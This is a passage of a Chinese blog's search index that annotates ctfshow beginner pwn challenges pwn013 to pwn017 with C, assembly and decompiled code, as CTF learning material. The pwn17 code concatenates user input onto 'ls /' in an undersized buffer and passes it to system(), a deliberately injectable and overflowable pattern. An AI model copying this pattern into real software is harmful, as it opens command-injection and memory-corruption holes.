<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>pwn013-034</title>
      <link href="/du-yu/pwn-begain-exerciser-03.html"/>
      <url>/du-yu/pwn-begain-exerciser-03.html</url>
      
        <content type="html"><![CDATA[<h1 id="一、pwn013-c源代码"><a href="#一、pwn013-c源代码" class="headerlink" title="一、pwn013.c源代码"></a>一、pwn013.c源代码</h1><pre class="line-numbers language-c" data-language="c"><code class="language-c">#include &lt;stdio.h&gt;int main() {    char flag[] = {99, 116, 102, 115, 104, 111, 119, 123, 104, 79, 119, 95, 116, 48, 95, 117, 115, 51, 95, 71, 67, 67, 63, 125, 0};    printf("%s", flag);    return 0;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在C语言中，<code>char</code>不是一个函数，而是一个数据类型，用于存储字符。当我们创建一个<code>char</code>类型的变量或数组，并给它赋值时，我们可以直接使用字符，如 <code>'a'</code>，或者使用对应的ASCII值，如 <code>97</code>。这两种方式都是等价的，因为 <code>'a'</code> 的ASCII值就是 <code>97</code>。</p><p>例如，以下两种方式创建的字符变量是等价的：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">char ch1 = 'a';char ch2 = 97;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>在这两种情况下，<code>ch1</code> 和 <code>ch2</code> 都存储了字符 <code>'a'</code>。</p><p>同样，我们可以使用ASCII值来初始化字符数组：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">char arr1[] = {'H', 'e', 'l', 'l', 'o', '\0'};char arr2[] = {72, 101, 108, 108, 111, 0};<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>在这两种情况下，<code>arr1</code> 和 <code>arr2</code> 都存储了字符串 “Hello”。因为 <code>'H'</code> 的ASCII值是 <code>72</code>，<code>'e'</code> 的ASCII值是 <code>101</code>，以此类推。最后的 <code>'\0'</code> 或 <code>0</code> 是字符串的结束标记，也就是空字符（null character）。</p><h1 id="二、pwn014-c源代码"><a href="#二、pwn014-c源代码" class="headerlink" title="二、pwn014.c源代码"></a>二、pwn014.c源代码</h1><pre class="line-numbers language-c" data-language="c"><code class="language-c">#include &lt;stdio.h&gt; // 引入标准输入输出库#include &lt;stdlib.h&gt; // 引入标准库#define BUFFER_SIZE 1024 // 定义缓冲区大小为1024int main() { // 主函数    FILE *fp; // 定义文件指针    unsigned char buffer[BUFFER_SIZE]; // 定义一个大小为BUFFER_SIZE的无符号字符数组作为缓冲区    size_t n; // 定义一个变量n，用于存储读取的字节数    fp = fopen("key", "rb"); // 以二进制读模式打开名为"key"的文件    if (fp == NULL) { // 如果文件打开失败        perror("Nothing here!"); // 打印错误信息        return -1; // 返回-1并结束程序    }    char output[BUFFER_SIZE * 9 + 12]; // 定义一个字符数组用于存储输出的字符串    int offset = 0; // 定义一个偏移量，用于在output数组中添加字符    offset += sprintf(output + offset, "ctfshow{"); // 在output数组的开头添加"ctfshow{"    while ((n = fread(buffer, sizeof(unsigned char), BUFFER_SIZE, fp)) &gt; 0) { // 循环读取文件，每次读取BUFFER_SIZE个字节，直到文件结束              for (size_t i = 0; i &lt; n; i++) { // 遍历 每个读取的字节            for (int j = 7; j &gt;= 0; j--) { // 遍历字节的每一位                offset += sprintf(output + offset, "%d", (buffer[i] &gt;&gt; j) &amp; 1); // 将字节的每一位转换为二进制并添加到output数组中            }            if (i != n - 1) { // 如果不是最后一个字节                offset += sprintf(output + offset, "_"); // 在字节之间添加"_"            }        }        if (!feof(fp)) { // 如果文件还没有读完            offset += sprintf(output + offset, " "); // 在每个BUFFER_SIZE个字节之间添加" "        }    }    offset += sprintf(output + offset, "}"); // 在output数组的末尾添加"}"    printf("%s\n", output); // 打印output数组    fclose(fp); // 关闭文件    return 0; // 返回0并结束程序}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="1-指针fp："><a href="#1-指针fp：" class="headerlink" title="1.指针fp："></a>1.指针fp：</h3><p>总结：<code>fp</code> 是用来<strong>操作</strong> “key” 文件的。</p><p><code>fp</code> 是一个文件指针，它在 C 语言中用于操作文件。在这个程序中，<code>fp</code> 被用来打开一个名为 “key” 的文件，并读取其内容。</p><p>在 C 语言中，文件操作的函数（如 <code>fopen</code>，<code>fread</code>，<code>fclose</code> 等）都需要一个文件指针作为参数。这个文件指针指向一个 <code>FILE</code> 结构体，这个结构体包含了文件的所有信息，如文件位置，错误状态等。</p><p>在这个程序中，<code>fp</code> 被用在以下几个地方：</p><ul><li><p><code>fp = fopen("key", "rb");</code>：这行代码打开一个名为 “key” 的文件，并返回一个文件指针，这个文件指针被赋值给 <code>fp</code>。”rb” 表示以二进制读模式打开文件。</p></li><li><p><code>if (fp == NULL) { ... }</code>：这行代码检查 <code>fp</code> 是否为 <code>NULL</code>。如果 <code>fp</code> 为 <code>NULL</code>，说明文件打开失败。</p></li><li><p><code>while ((n = fread(buffer, sizeof(unsigned char), BUFFER_SIZE, fp)) &gt; 0) { ... }</code>：这行代码使用 <code>fread</code> 函数从文件中读取数据。<code>fread</code> 函数需要一个文件指针作为参数，这里就是 <code>fp</code>。</p></li><li><p><code>if (!feof(fp)) { ... }</code>：这行代码使用 <code>feof</code> 函数检查文件是否已经读到末尾。<code>feof</code> 函数需要一个文件指针作为参数，这里就是 <code>fp</code>。</p></li><li><p><code>fclose(fp);</code>：这行代码使用 <code>fclose</code> 函数关闭文件。<code>fclose</code> 函数需要一个文件指针作为参数，这里就是 <code>fp</code>。</p></li></ul><p>在C语言中，操作文件需要使用文件指针，如<code>fp</code>，主要有以下几个原因：</p><ol><li><p><strong>抽象和封装</strong>：文件指针是一个指向<code>FILE</code>结构体的指针，这个结构体在C语言的标准库中定义。<code>FILE</code>结构体包含了所有关于文件的信息，如文件位置、错误状态、缓冲区等。通过使用文件指针，C语言的标准库可以封装所有的文件操作，使得程序员不需要关心文件操作的底层细节。</p></li><li><p><strong>动态和灵活</strong>：通过使用文件指针，你可以动态地打开、读写和关闭文件。例如，你可以在运行时决定打开哪个文件，或者同时打开多个文件。</p></li><li><p><strong>兼容性</strong>：使用文件指针的文件操作函数（如<code>fopen</code>、<code>fread</code>、<code>fwrite</code>、<code>fclose</code>等）是C语言标准库的一部分，这意味着它们可以在几乎所有的C语言环境中使用，包括不同的操作系统和硬件平台。</p></li><li><p><strong>错误处理</strong>：如果文件操作失败（例如，试图打开一个不存在的文件），<code>fopen</code>函数会返回<code>NULL</code>，你可以检查文件指针是否为<code>NULL</code>来判断文件操作是否成功。</p></li></ol><p>总的来说，使用文件指针是C语言处理文件的一种高级、抽象、灵活和兼容的方式。</p><h3 id="2-BUFFER-SIZE-9-12和offset"><a href="#2-BUFFER-SIZE-9-12和offset" class="headerlink" title="2.BUFFER_SIZE * 9 + 12和offset"></a>2.BUFFER_SIZE * 9 + 12<code>和</code>offset</h3><p>这段代码的主要目的是将读取到的每个字节转换为二进制形式，并将其存储在<code>output</code>数组中。这里的<code>BUFFER_SIZE * 9 + 12</code>和<code>offset</code>是关键部分，我会详细解释。</p><p>首先，<code>char output[BUFFER_SIZE * 9 + 12];</code>定义了一个字符数组<code>output</code>，用于存储输出的字符串。这个数组的大小是<code>BUFFER_SIZE * 9 + 12</code>，这是因为每个字节（8位）被转换为二进制形式后，需要9个字符的空间（8个字符表示二进制，1个字符表示下划线”_”）。所以，<code>BUFFER_SIZE</code>个字节需要<code>BUFFER_SIZE * 9</code>个字符的空间。另外，字符串的开头有”ctfshow{“（8个字符），末尾有”}”（1个字符），以及可能的空格字符（最多3个），所以总共需要额外的12个字符的空间。</p><p>然后，<code>int offset = 0;</code>定义了一个变量<code>offset</code>，它表示下一个要写入<code>output</code>数组的位置。初始时，<code>offset</code>被设置为0，表示从<code>output</code>数组的开头开始写入。</p><p>接下来，<code>offset += sprintf(output + offset, "ctfshow{");</code>将字符串”ctfshow{“写入<code>output</code>数组，并将<code>offset</code>增加了写入的字符数（即”ctfshow{“的长度，也就是8）。这样，<code>offset</code>就指向了<code>output</code>数组中下一个要写入的位置。</p><p>在接下来的循环中，每个字节的每一位都被转换为二进制形式，并写入<code>output</code>数组。<code>offset += sprintf(output + offset, "%d", (buffer[i] &gt;&gt; j) &amp; 1);</code>这行代码做了两件事：一是将字节的一位转换为二进制形式并写入<code>output</code>数组，二是将<code>offset</code>增加了写入的字符数（这里是1，因为一位二进制只需要1个字符的空间）。这样，<code>offset</code>就始终指向了<code>output</code>数组中下一个要写入的位置。</p><p>总的来说，<code>BUFFER_SIZE * 9 + 12</code>是为了确保<code>output</code>数组有足够的空间来存储转换为二进制形式的字节，以及其他的字符。而<code>offset</code>则是用来跟踪<code>output</code>数组中下一个要写入的位置。</p><p>这行代码使用了两个函数：<code>sprintf</code>和<code>+=</code>操作符。我会分别解释它们。</p><h3 id="3、offset-x3D-sprintf-output-offset-“ctfshow-“"><a href="#3、offset-x3D-sprintf-output-offset-“ctfshow-“" class="headerlink" title="3、offset += sprintf(output + offset, “ctfshow{“"></a>3、offset += sprintf(output + offset, “ctfshow{“</h3><ol><li><p><code>sprintf</code>函数：<code>sprintf</code>是C语言中的一个函数，它用于将格式化的数据写入字符串。它的原型是<code>int sprintf(char *str, const char *format, ...);</code>，其中<code>str</code>是目标字符串，<code>format</code>是格式化字符串，<code>...</code>表示可变数量的参数。</p><p>在这个例子中，<code>sprintf(output + offset, "ctfshow{"</code>将字符串”ctfshow{“写入<code>output</code>数组的<code>offset</code>位置。<code>output + offset</code>表示<code>output</code>数组的<code>offset</code>位置的指针。这样，”ctfshow{“就被写入了<code>output</code>数组的正确位置。</p><p><code>sprintf</code>函数返回写入的字符数。在这个例子中，”ctfshow{“有8个字符，所以<code>sprintf</code>函数返回8。</p></li><li><p><code>+=</code>操作符：<code>+=</code>是C语言中的一个复合赋值操作符，它将左边的变量增加右边的值。例如，<code>a += b</code>等价于<code>a = a + b</code>。</p><p>在这个例子中，<code>offset += sprintf(output + offset, "ctfshow{"</code>将<code>offset</code>增加了<code>sprintf</code>函数返回的值，也就是写入的字符数。这样，<code>offset</code>就被更新为了<code>output</code>数组中下一个要写入的位置。</p></li><li><p>当我们写<code>output + offset</code>时，我们实际上是在进行指针运算。<code>output</code>是一个指针，它指向<code>output</code>数组的开始位置，<code>offset</code>是一个整数，它表示的是从<code>output</code>数组的开始位置开始的偏移量。所以，<code>output + offset</code>实际上是一个新的指针，它指向<code>output</code>数组中的<code>offset</code>位置。</p></li></ol><p>总的来说，<code>offset += sprintf(output + offset, "ctfshow{"</code>这行代码的作用是将字符串”ctfshow{“写入<code>output</code>数组的<code>offset</code>位置，并将<code>offset</code>更新为下一个要写入的位置。</p><h3 id="4、while-n-x3D-fread-buffer-sizeof-unsigned-char-BUFFER-SIZE-fp-gt-0"><a href="#4、while-n-x3D-fread-buffer-sizeof-unsigned-char-BUFFER-SIZE-fp-gt-0" class="headerlink" title="4、while ((n = fread(buffer, sizeof(unsigned char), BUFFER_SIZE, fp)) > 0)"></a>4、while ((n = fread(buffer, sizeof(unsigned char), BUFFER_SIZE, fp)) &gt; 0)</h3><p>这是一个<code>while</code>循环，它使用<code>fread</code>函数从文件中读取数据。让我们详细解释一下这个函数和循环的工作原理。</p><p><code>fread</code>是一个标准库函数，用于从文件流中读取数据。它的原型如下：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">size_t fread(void *ptr, size_t size, size_t nmemb, FILE *stream);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这个函数有四个参数：</p><ol><li><code>ptr</code>：这是一个指向你想要存储读取数据的内存区域的指针。</li><li><code>size</code>：这是你想要读取的每个数据项的大小，以字节为单位。</li><li><code>nmemb</code>：这是你想要读取的数据项的数量。</li><li><code>stream</code>：这是一个指向你想要读取的文件流的指针。</li></ol><p><code>fread</code>函数会尝试读取<code>nmemb</code>个数据项，每个数据项的大小为<code>size</code>字节，从<code>stream</code>指向的文件流中，然后将读取的数据存储在<code>ptr</code>指向的内存区域。函数返回实际读取的数据项数量。</p><p>在你的代码中，<code>fread</code>函数的调用如下：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">n = fread(buffer, sizeof(unsigned char), BUFFER_SIZE, fp)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这里，<code>buffer</code>是一个指向你想要存储读取数据的内存区域的指针，<code>sizeof(unsigned char)</code>是你想要读取的每个数据项的大小（这里是1字节），<code>BUFFER_SIZE</code>是你想要读取的数据项的数量，<code>fp</code>是一个指向你想要读取的文件流的指针。函数返回实际读取的数据项数量，并将这个数量赋值给<code>n</code>。</p><p><code>while ((n = fread(buffer, sizeof(unsigned char), BUFFER_SIZE, fp)) &gt; 0)</code>这个循环会一直执行，直到<code>fread</code>函数返回的值不大于0，也就是说，直到没有更多的数据可以从文件中读取，或者发生了错误。在每次循环中，都会读取最多<code>BUFFER_SIZE</code>个字节的数据，并将读取的字节数赋值给<code>n</code>。然后，循环体中的代码会处理这些读取的数据。</p><h3 id="5、while循环"><a href="#5、while循环" class="headerlink" title="5、while循环"></a>5、while循环</h3><ol><li><code>for (size_t i = 0; i &lt; n; i++) {</code>：这是外层循环，它遍历每个读取的字节。<code>n</code>是通过<code>fread</code>函数从文件中读取的字节数，所以这个循环会遍历<code>buffer</code>数组中的每个字节。</li><li><code>for (int j = 7; j &gt;= 0; j--) {</code>：这是内层循环，它遍历字节的每一位。因为一个字节由8位（bit）组成，所以这个循环从7开始，到0结束，遍历字节的每一位。</li><li><code>offset += sprintf(output + offset, "%d", (buffer[i] &gt;&gt; j) &amp; 1);</code>：这行代码将字节的每一位转换为二进制形式，并将结果添加到<code>output</code>数组中。这里的<code>buffer[i] &gt;&gt; j</code>是将<code>buffer[i]</code>的第<code>j</code>位移动到最右边，然后<code>&amp; 1</code>操作获取这一位的值（0或1）。<code>sprintf(output + offset, "%d", (buffer[i] &gt;&gt; j) &amp; 1)</code>将这个值转换为字符串（”0”或”1”），并写入<code>output</code>数组的<code>offset</code>位置。然后，<code>offset</code>被增加了写入的字符数（这里是1），所以它始终指向<code>output</code>数组中下一个要写入的位置。</li></ol><p>总的来说，这段代码是在将每个读取的字节转换为二进制形式，并将这些二进制形式的字节存储在<code>output</code>数组中。这个过程通过两个循环完成：外层循环遍历每个字节，内层循环遍历字节的每一位。</p><h4 id="运算过程："><a href="#运算过程：" class="headerlink" title="运算过程："></a>运算过程：</h4><ul><li>“C”的ASCII码值是67，二进制形式是1000011。</li><li>“T”的ASCII码值是84，二进制形式是1010100。</li><li>“F”的ASCII码值是70，二进制形式是1000110。</li><li>“s”的ASCII码值是115，二进制形式是1110011。</li><li>“h”的ASCII码值是104，二进制形式是1101000。</li><li>“o”的ASCII码值是111，二进制形式是1101111。</li><li>“w”的ASCII码值是119，二进制形式是1110111。</li></ul><p>然后，我们来看这个循环过程。假设我们已经从文件中读取了”CTFshow”，并将其存储在<code>buffer</code>数组中。那么，<code>n</code>就是7，因为”CTFshow”有7个字符。</p><p>在外层循环中，<code>i</code>从0到6，所以<code>buffer[i]</code>就是”CTFshow”的每个字符的ASCII码值。在内层循环中，<code>j</code>从7到0，所以<code>(buffer[i] &gt;&gt; j) &amp; 1</code>就是<code>buffer[i]</code>的每一位的值。然后，这个值被转换为字符串（”0”或”1”），并被添加到<code>output</code>数组中。</p><p>例如，当<code>i</code>是0时，<code>buffer[i]</code>就是”C”的ASCII码值67，它的二进制形式是1000011。在内层循环中，我们将67的每一位的值（从左到右）添加到<code>output</code>数组中，得到”1000011”。</p><p>当我们对”CTFshow”的每个字符都做这个操作后，<code>output</code>数组中就存储了”CTFshow”的二进制形式，即”1000011_1010100_1000110_1110011_1101000_1101111_1110111”。</p><h1 id="三、pwn015汇编源代码"><a href="#三、pwn015汇编源代码" class="headerlink" title="三、pwn015汇编源代码"></a>三、pwn015汇编源代码</h1><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">section .data  ; 数据段，用于声明和初始化一些全局变量    str1 db "CTFshow",0  ; 声明一个字符串变量str1，值为"CTFshow"    str2 db "_3@sy",0    ; 声明一个字符串变量str2，值为"_3@sy"    str3 db "@ss3mb1y",0 ; 声明一个字符串变量str3，值为"@ss3mb1y"    str4 db "_1s",0      ; 声明一个字符串变量str4，值为"_1s"    str5 db "ctfshow{"   ; 声明一个字符串变量str5，值为"ctfshow{"    str6 db "}"          ; 声明一个字符串变量str6，值为"}"section .text  ; 代码段，用于存放程序的代码    global _start  ; 声明一个全局的_start标签，这是程序的入口点_start:  ; 程序的入口点    mov eax, 4  ; 系统调用号4，表示write操作    mov ebx, 1  ; 文件描述符1，表示标准输出stdout    mov ecx, str5  ; 要写入的字符串的地址    mov edx, 8  ; 要写入的字符串的长度    int 0x80  ; 执行系统调用    mov eax, 4  ; 同上，写入str3    mov ebx, 1    mov ecx, str3    mov edx, 8    int 0x80    mov eax, 4  ; 同上，写入str4    mov ebx, 1    mov ecx, str4    mov edx, 3    int 0x80    mov eax, 4  ; 同上，写入str2    mov ebx, 1    mov ecx, str2    mov edx, 5    int 0x80    mov eax, 4  ; 同上，写入str6    mov ebx, 1    mov ecx, str6    mov edx, 1    int 0x80    mov eax, 1  ; 系统调用号1，表示exit操作    xor ebx, ebx  ; 清零ebx，表示退出状态为0    int 0x80  ; 执行系统调用<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="四、pwn16"><a href="#四、pwn16" class="headerlink" title="四、pwn16"></a>四、pwn16</h1><h2 id="汇编源代码"><a href="#汇编源代码" class="headerlink" title="汇编源代码"></a>汇编源代码</h2><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">.file"flag.c"  # 指定源代码文件名为"flag.c".text  # 指定接下来的部分为代码段.section.rodata  # 指定接下来的部分为只读数据段.LC0:.string"ctfshow{"  # 定义一个字符串"ctfshow{".text  # 回到代码段.globlctfshow  # 定义一个全局函数ctfshow.typectfshow, @function  # 指定ctfshow的类型为函数ctfshow:  # ctfshow函数的开始.LFB0:.cfi_startproc  # 表示函数的开始pushq%rbp  # 保存基指针.cfi_def_cfa_offset 16  # 更新CFA（Canonical Frame Address）偏移量.cfi_offset 6, -16  # 保存%rbp的旧值movq%rsp, %rbp  # 将栈指针的值赋给基指针.cfi_def_cfa_register 6  # 更新CFA的基准寄存器subq$32, %rsp  # 为局部变量分配空间movq%rdi, -24(%rbp)  # 将函数的第一个参数（%rdi）保存到局部变量中leaq.LC0(%rip), %rdi  # 将字符串"ctfshow{"的地址加载到%rdi中movl$0, %eax  # 将%eax清零，因为printf函数的浮点参数数量是通过%eax传递的callprintf@PLT  # 调用printf函数，打印"ctfshow{"movl$0, -4(%rbp)  # 初始化一个局部变量为0jmp.L2  # 跳转到.L2标签.L3:movl-4(%rbp), %eax  # 将局部变量的值加载到%eax中movslq%eax, %rdx  # 将%eax的值符号扩展后存入%rdxmovq-24(%rbp), %rax  # 将保存的第一个参数的值加载到%rax中addq%rdx, %rax  # 将%rdx和%rax的值相加movzbl(%rax), %eax  # 将%rax指向的字符加载到%eax中，并零扩展movzbl%al, %eax  # 将%al的值零扩展到%eaxmovl%eax, %edi  # 将%eax的值赋给%edicallputchar@PLT  # 调用putchar函数，打印一个字符addl$1, -4(%rbp)  # 将局部变量加1.L2:cmpl$15, -4(%rbp)  # 检查局部变量是否小于等于15jle.L3  # 如果是，跳转到.L3标签movl$125, %edi  # 将字符'}'的ASCII值（125）加载到%edi中callputchar@PLT  # 调用putchar函数，打印字符'}'nop  # 无操作leave  # 恢复栈帧.cfi_def_cfa 7, 8  # 更新CFAret  # 返回.cfi_endproc  # 表示函数的结束.LFE0:.sizectfshow, .-ctfshow  # 指定ctfshow函数的大小.section.rodata  # 指定接下来的部分为只读数据段.LC1:.string"%2hhx"  # 定义一个字符串"%2hhx"    .text  # 回到代码段.globlmain  # 定义一个全局函数main.typemain, @function  # 指定main的类型为函数main:  # main函数的开始.LFB1:.cfi_startproc  # 表示函数的开始pushq%rbp  # 保存基指针.cfi_def_cfa_offset 16  # 更新CFA（Canonical Frame Address）偏移量.cfi_offset 6, -16  # 保存%rbp的旧值movq%rsp, %rbp  # 将栈指针的值赋给基指针.cfi_def_cfa_register 6  # 更新CFA的基准寄存器subq$64, %rsp  # 为局部变量分配空间movq%fs:40, %rax  # 从线程局部存储（TLS）中读取栈保护器的值movq%rax, -8(%rbp)  # 将栈保护器的值保存到局部变量中xorl%eax, %eax  # 将%eax清零movabsq$4122593792332543030, %rax  # 将一个64位的常数加载到%rax中movabsq$3834596513518335287, %rdx  # 将另一个64位的常数加载到%rdx中movq%rax, -32(%rbp)  # 将%rax的值保存到局部变量中movq%rdx, -24(%rbp)  # 将%rdx的值保存到局部变量中movl$825635894, -16(%rbp)  # 将一个32位的常数保存到局部变量中movb$0, -12(%rbp)  # 将一个字节的0保存到局部变量中movl$0, -52(%rbp)  # 初始化一个局部变量为0jmp.L5  # 跳转到.L5标签.L6:leaq-48(%rbp), %rdx  # 将一个局部变量的地址加载到%rdx中movl-52(%rbp), %eax  # 将局部变量的值加载到%eax中cltq  # 将%eax的值符号扩展到64位addq%rax, %rdx  # 将%rax和%rdx的值相加movl-52(%rbp), %eax  # 将局部变量的值加载到%eax中addl%eax, %eax  # 将%eax的值加倍leaq-32(%rbp), %rcx  # 将另一个局部变量的地址加载到%rcx中cltq  # 将%eax的值符号扩展到64位addq%rcx, %rax  # 将%rcx和%rax的值相加leaq.LC1(%rip), %rsi  # 将字符串"%2hhx"的地址加载到%rsi中movq%rax, %rdi  # 将%rax的值赋给%rdimovl$0, %eax  # 将%eax清零，因为__isoc99_sscanf函数的浮点参数数量是通过%eax传递的call__isoc99_sscanf@PLT  # 调用__isoc99_sscanf函数，将一个字节的十六进制数转换为字符addl$1, -52(%rbp)  # 将局部变量加1.L5:cmpl$15, -52(%rbp)  # 检查局部变量是否小于等于15jle.L6  # 如果是，跳转到.L6标签leaq-48(%rbp), %rax  # 将一个局部变量的地址加载到%rax中movq%rax, %rdi  # 将%rax的值赋给%rdicallctfshow  # 调用ctfshow函数，打印字符串movl$0, %eax  # 将%eax清零，表示main函数的返回值为0movq-8(%rbp), %rsi  # 将保存的栈保护器的值加载到%rsi中xorq%fs:40, %rsi  # 将%rsi的值与TLS中的栈保护器的值进行异或操作je.L8  # 如果结果为0，跳转到.L8标签call__stack_chk_fail@PLT  # 如果结果不为0，调用__stack_chk_fail函数，表示栈溢出.L8:leave  # 恢复栈帧.cfi_def_cfa 7, 8  # 更新CFAret  # 返回.cfi_endproc  # 表示函数的结束.LFE1:.sizemain, .-main  # 指定main函数的大小.ident"GCC: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0"  # 指定编译器的版本信息.section.note.GNU-stack,"",@progbits  # 指定接下来的部分为GNU堆栈段<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="反汇编C源代"><a href="#反汇编C源代" class="headerlink" title="反汇编C源代"></a>反汇编C源代</h2><pre class="line-numbers language-c" data-language="c"><code class="language-c">int __cdecl main(int argc, const char **argv, const char **envp)  // 主函数{  int i;  // 定义一个整型变量i  char v5[16];  // 定义一个长度为16的字符数组v5  char v6[24];  // 定义一个长度为24的字符数组v6  unsigned __int64 v7;  // 定义一个64位无符号整型变量v7  v7 = __readfsqword(0x28u);  // 从线程局部存储（TLS）中读取栈保护器的值  strcpy(v6, "64616e69756e69756461");  // 将字符串"64616e69756e69756461"复制到v6中  for ( i = 0; i &lt;= 15; ++i )  // 对于i从0到15  {    argv = (const char **)"%2hhx";  // 将argv指向字符串"%2hhx"    __isoc99_sscanf(&amp;v6[2 * i], "%2hhx", &amp;v5[i]);  // 从v6中读取一个字节的十六进制数，并将其转换为字符存储到v5中  }  ctfshow(v5, argv);  // 调用ctfshow函数，打印v5中的字符串  return 0;  // 返回0}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-c" data-language="c"><code class="language-c">int __fastcall ctfshow(__int64 a1)  // ctfshow函数，参数是一个64位整数a1，表示一个内存地址{  int i;  // 定义一个整型变量i  printf("ctfshow{");  // 打印字符串"ctfshow{"  for ( i = 0; i &lt;= 15; ++i )  // 对于i从0到15    putchar(*(unsigned __int8 *)(i + a1));  // 从内存地址a1+i处读取一个字符，并打印出来  return putchar(125);  // 打印字符'}'，并返回其ASCII值（125）}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="五、pwn17"><a href="#五、pwn17" class="headerlink" title="五、pwn17"></a>五、pwn17</h1><h2 id="C源代码"><a href="#C源代码" class="headerlink" title="C源代码"></a>C源代码</h2><pre class="line-numbers language-c" data-language="c"><code class="language-c">int __cdecl main(int argc, const char **argv, const char **envp) // 主函数，程序的入口点{  int v4; // 定义一个整型变量v4，用于存储用户的输入  char dest[4]; // 定义一个字符数组dest，大小为4，用于存储命令  char buf[10]; // 定义一个字符数组buf，大小为10，用于存储用户的输入  unsigned __int64 v7; // 定义一个无符号64位整型变量v7  v7 = __readfsqword(0x28u); // 读取FS段寄存器的值，这是一种防止缓冲区溢出的保护机制  setvbuf(_bss_start, 0LL, 2, 0LL); // 设置_bss_start的缓冲区模式为_IONBF，即不进行缓冲  setvbuf(stdin, 0LL, 1, 0LL); // 设置stdin的缓冲区模式为_IONBF，即不进行缓冲  puts(asc_D48); // 输出字符串asc_D48  puts(asc_DC0); // 输出字符串asc_DC0  puts(asc_E40); // 输出字符串asc_E40  puts(asc_ED0); // 输出字符串asc_ED0  puts(asc_F60); // 输出字符串asc_F60  puts(asc_FE8); // 输出字符串asc_FE8  puts(asc_1080); // 输出字符串asc_1080  puts("    * *************************************                           "); // 输出字符串  puts(aClassifyCtfsho); // 输出字符串aClassifyCtfsho  puts("    * Type  : Linux_Security_Mechanisms                               "); // 输出字符串  puts("    * Site  : https://ctf.show/                                       "); // 输出字符串  puts("    * Hint  : You should understand the basic command usage of Linux! "); // 输出字符串  puts("    * *************************************                           "); // 输出字符串  *(_DWORD *)dest = 790655852; // 将整数790655852转换为字符数组存储在dest中  v4 = 0; // 初始化v4为0  puts("\nHow much do you know about Linux commands? \n"); // 输出提示信息  while ( 1 ) // 进入无限循环  {    menu(); // 调用menu函数，显示菜单    v4 = 0; // 将v4重置为0    puts("\nEnter the command you want choose:(1.2.3.4 or 5)\n"); // 输出提示信息    __isoc99_scanf("%d", &amp;v4); // 读取用户的输入，存储在v4中    switch ( v4 ) // 根据v4的值执行不同的命令    {      case 1:        system("id"); // 执行id命令，显示当前用户的信息        break;      case 2:        puts("Which directory?('/','./' or the directiry you want?)"); // 输出提示信息        read(0, buf, 0xAuLL); // 读取用户的输入，存储在buf中        strcat(dest, buf); // 将buf中的字符串追加到dest中        system(dest); // 执行dest中的命令        puts("Execution succeeded!"); // 输出执行成功的信息        break;      case 3:        sleep(1u); // 等待1秒        puts("$cat /ctfshow_flag"); // 输出字符串        sleep(1u); // 等待1秒        puts("ctfshow{"); // 输出字符串        sleep(2u); // 等待2秒        puts("... ..."); // 输出字符串        sleep(3u); // 等待3秒        puts("Your flag is ..."); // 输出字符串        sleep(5u); // 等待5秒        puts("ctfshow{flag is not here!}"); // 输出字符串        sleep(0x14u); // 等待20秒        puts("wtf?You haven't left yet?\nOk~ give you flag:\nflag is loading......"); // 输出字符串        sleep(0x1BF52u); // 等待114194秒        system("cat /ctfshow_flag"); // 执行命令，显示flag        break;      case 4:        sleep(2u); // 等待2秒        puts("su: Authentication failure"); // 输出字符串        break;      case 5:        puts("See you!"); // 输出字符串        exit(-1); // 退出程序      default:        puts("command not found!"); // 如果v4的值不是1-5，输出命令未找到的信息        break;    }  }}<span aria-hidden="true" 